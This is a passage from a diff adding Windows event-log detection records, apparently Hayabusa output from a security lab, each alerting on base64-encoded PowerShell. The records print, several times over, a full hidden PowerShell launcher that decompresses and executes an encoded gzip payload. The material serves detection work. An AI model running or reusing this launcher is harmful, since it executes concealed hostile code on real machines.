boX9sNgMTGbZHyWx0bRujkW2g6+7He+tUC7TT6Q0OjemkSWfrm3EIc3vTG51rervvkyc+2wBwXY5wMAaZwGx64QpkrNfIeD3kaRPfGRwZIGPP7lE3vF3bDoP9q+smRxM2vMHoYra1Ne3o1mmjns6n3QCNQBwHxgij9MF6srSjic/96Zvh7Uqb3LBjzTJHTniTx6yto/x307POvdnRxrs8bhv6vRnRiC2bvnZ6fWLEm/PAeQj80fR4/DjcLuHca02bvMrZBHSqLWfm0npGlJ/V+QFO0hAzIBDU7+rW2jyxy4rscJprKErRze9IEhMGrRCaZcV9xBj38p6QF29oR0WTyHvWNQxbzRdHqvRVUP3WKaqls7MZeAl36dFrXJA4EGFdf2zpOlR9/bGtQ5C/HpfJ11sFDNXznlHgUhhmO8Nqfrlq7Ol/xqq80SH8+f+C1be1f9j9Jfz0ehnvD+vfL/wWnr8f+xRTAaIuVCVGirb4IgQlM569OLAnyPuqfPI3v8tMHA7hbeJg/y89wtRZZwoAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))",
+     "pid": "2288"
+    },
+    "user": {
+     "name": "FS03VULN$"
+    },
+    "rule": {
+     "name": "Base64 Encoded PowerShell Command Detected",
+     "id": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7",
+     "level": "high"
+    },
+    "host": {
+     "name": "fs03vuln.offsec.lan"
+    }
+   },
+   "ts": "2021-04-22T08:51:05Z",
+   "_id": "2506750067847404d678e2de8f7329c7e6d0c103"
+  },
+  {
+   "family": "hayabusa",
+   "file": "hayabusa/evtx-timeline.csv",
+   "line": 318,
+   "text": "\"2021-04-21 20:26:43.246 +05:30\",\"Base64 Encoded PowerShell Command Detected\",\"high\",\"srvdefender01.offsec.lan\",\"Sec\",4688,354578,\"Cmdline: C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"\"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"\" ¦ Proc: C:\\Windows\\System32\\cmd.exe ¦ PID: 5392 ¦ User: SRVDEFENDER01$ ¦ LID: 0x3e7\",\"MandatoryLabel: SYSTEM_INTEGRITY ¦ ParentProcessName: C:\\Windows\\System32\\services.exe ¦ ProcessId: 568 ¦ SubjectDomainName: OFFSEC ¦ SubjectUserSid: S-1-5-18 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: FULL_TOKEN\",\"c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7\"",
+   "fields": {
+    "Timestamp": "2021-04-21 20:26:43.246 +05:30",
+    "RuleTitle": "Base64 Encoded PowerShell Command Detected",
+    "Level": "high",
+    "Computer": "srvdefender01.offsec.lan",
+    "Channel": "Sec",
+    "EventID": "4688",
+    "RecordID": "354578",
+    "Details": "Cmdline: C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\" ¦ Proc: C:\\Windows\\System32\\cmd.exe ¦ PID: 5392 ¦ User: SRVDEFENDER01$ ¦ LID: 0x3e7",
+    "ExtraFieldInfo": "MandatoryLabel: SYSTEM_INTEGRITY ¦ ParentProcessName: C:\\Windows\\System32\\services.exe ¦ ProcessId: 568 ¦ SubjectDomainName: OFFSEC ¦ SubjectUserSid: S-1-5-18 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: FULL_TOKEN",
+    "RuleID": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7"
+   },
+   "host": "srvdefender01.offsec.lan",
+   "ecs": {
+    "winlog": {
+     "channel": "Security",
+     "event_data": {
+      "MandatoryLabel": "S-1-16-16384",
+      "ParentProcessName": "C:\\Windows\\System32\\services.exe",
+      "ProcessId": "568",
+      "SubjectDomainName": "OFFSEC",
+      "SubjectUserSid": "S-1-5-18",
+      "TargetLogonId": "0x0",
+      "TargetUserSid": "S-1-0-0",
+      "TokenElevationType": "%%1936",
+      "CommandLine": "C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
+      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
+      "NewProcessId": "5392",
+      "SubjectUserName": "SRVDEFENDER01$",
+      "SubjectLogonId": "0x3e7"
+     },
+     "record_id": "354578"
+    },
+    "event": {
+     "provider": "Microsoft-Windows-Security-Auditing",
+     "code": "4688"
+    },
+    "process": {
+     "executable": "C:\\Windows\\System32\\cmd.exe",
+     "command_line": "C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
+     "pid": "5392"
+    },
+    "user": {
+     "name": "SRVDEFENDER01$"
+    },
+    "rule": {
+     "name": "Base64 Encoded PowerShell Command Detected",
+     "id": "c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7",
+     "level": "high"
+    },
+    "host": {
+     "name": "srvdefender01.offsec.lan"
+    }
+   },
+   "ts": "2021-04-21T14:56:43Z",
+   "_id": "47290785b58c6be6d3c048672ac380656ad0ac9d"
+  },
+  {
+   "family": "hayabusa",
+   "file": "hayabusa/evtx-timeline.csv",
+   "line": 319,
+   "text": "\"2021-04-21 20:26:43.280 +05:30\",\"Base64 Encoded PowerShell Command Detected\",\"high\",\"srvdefender01.offsec.lan\",\"Sec\",4688,354579,\"Cmdline: powershell.exe -nop -w hidden -noni -c \"\"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gEwP5X2WPfOm724jzHrxOnJ3+DTnHlctdCgAA''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"\" ¦ Proc: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ¦ PID: 4416 ¦ User: SRVDEFENDER01$ ¦ LID: 0x3e7\",\"MandatoryLabel: SYSTEM_INTEGRITY ¦ ParentProcessName: C:\\Windows\\System32\\cmd.exe ¦ ProcessId: 5392 ¦ SubjectDomainName: OFFSEC ¦ SubjectUserSid: S-1-5-18 ¦ TargetDomainName: - ¦ TargetLogonId: 0x0 ¦ TargetUserName: - ¦ TargetUserSid: S-1-0-0 ¦ TokenElevationType: FULL_TOKEN\",\"c03c42ba-1e4e-45c3-c0ba-c8d38b077ee7\"",
+   "fields": {
+    "Timestamp": "2021-04-21 20:26:43.280 +05:30",
+    "RuleTitle": "Base64 Encoded PowerShell Command Detected",
+    "Level": "high",
+    "Computer": "srvdefender01.offsec.lan",
+    "Channel": "Sec",
+    "EventID": "4688",
+    "RecordID": "354579",
+    "Details": "Cmdline: powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''H4sIAPU7gGACA7VW+2/aSBD+OZHyP1gVErZKsHlcEyJVurUdHk0gBof3odNiL/Y2ay+xFwjp9X+/WbDbVE3v2pPO4rGPmdmZb76d8WoTe4LyWBG1Zah8Ojs9cXCCI0UtPH5YlZQCtWhLOzmB9ULwUXmvqHO0Xts8wjReXF1ZmyQhsTjOyy0iUJqSaMkoSVVN+UsZhyQh53fLj8QTyiel8Ge5xfgSs0xsb2EvJMo5in25d8s9LH0pu2tGhVr844+iNj+vLMrXjxvMUrXo7lNBorLPWFFTPmvywPv9mqjFLvUSnvKVKI9pXKuWh3GKV6QH1rakS0TI/bSoQQzwSYjYJLEC0Uj146ZahKGTcA/5fkLStFhS5tLwfLH4XZ1npw42saARKXdiQRK+dkmypR5Jy20c+4wMyGoBWq5IaBwsNA3EtvyBqIV4w1hJ+RUzao/scsx+Vkl9qQRSjki0EiTxuyi73N8wctQrvuKmTLsGT556QO3z2enZ6SrnCd42ti95AqOT+WFMwDfV4Sk9yL1XjJLShXOw4MkepoX7ZEO0xRdklUJqL0s/Vq/ksiD53DD2EazNR5z6C9DJkll4vJSrP6akTVY0JvY+xhH1ctapryFMVowcIiznYj3wSS1mG8S3CSMBFhI1mejv1K4jKr7omhvKfJIgD7KUgleQQO1bZ46JUIuduEsiQOg4B+YVVsB1kktn/N7np8s5CBUthtO0pDgbuGxeSXEJZsQvKShOabaFNoIfhsWv7nY3TFAPpyI3t9COKGanWTxORbLxIGUQ+b27Jh7FTAJRUtrUJ+bepUF+avFVGCzMGFwBsLSFNMCKDN8VkggJOCiTrpVdIjrRmpEIRA5XvslwABc84/mBODggfvFb93IeH0krYcjjf+Ec5NZlXJSUEU0E1A0J6YE//+nwFxUD3LASkuVAzS/G3NwLSedC0AieJRkzSA4AJAKCbyY8MnFK3tWP1UF9o99RB8EztdvurCPcLnztTsxopTPsri4dYfCI1jq861mp02peIroLdt5lD3n+B580XJDrU6NziXzrtt8OJ6FnGveoDWvBdNgR0w5q34ceMxy7rbvT1KC79ljaOtrw6vX2xEC1Wv2uZjwAblNaCR6Q34vo7ukWxlAG727NTmoaHXb9wRosx9XmbMzaer0ZrsY8dd9NbV3XGz62u3uETO7XuvtJZcDv215k1mOuN6z6A7pGyIqvR02T30zNBDn6CAdrboX+hVUNLIRaF5TM+sOm2e83TTRsfXy0G3qgN8YTHJrjUZXO1pNBCPPmrt2/0Y16xyfPfLYD4Foc4WAAMoFV9cIVyNhvkfm2x9MqfjA5MkGmOXtErXC6bjoM9u+HVY5GrDfB6Ha2b+p6ZerUUdvg41aA+iCOA7OPUbq1n229MvK5P/6tN13powm70G2r74QTGbO+juTvrm3feLPKzru7qJvGoxXRiC2rvt4YXprx7iZwtoHfH18Mnnr7JZw71PXRG8kmoFPBC8d+5QVRflTbuzhJQ8yAQFC28/va5Ekzq8QOp1JDVQ+d+4EkMWHQ+qA55sxHjHFPtoFDzYYWdGwMsk8NYVirvjrSlC+C2tcGkS9dXc3AS7hKku7lWxIHIiwZTzXDgHJvPNUNCPPnI7P4eq8eTJVkuzhikxtnB+OavGSFVMTx/4tZdrVD+PP/DbOva/+w+1M4GqUs5u/Wv134JVR/OfYxpgIkXShOjBz74usQZAx58d4gE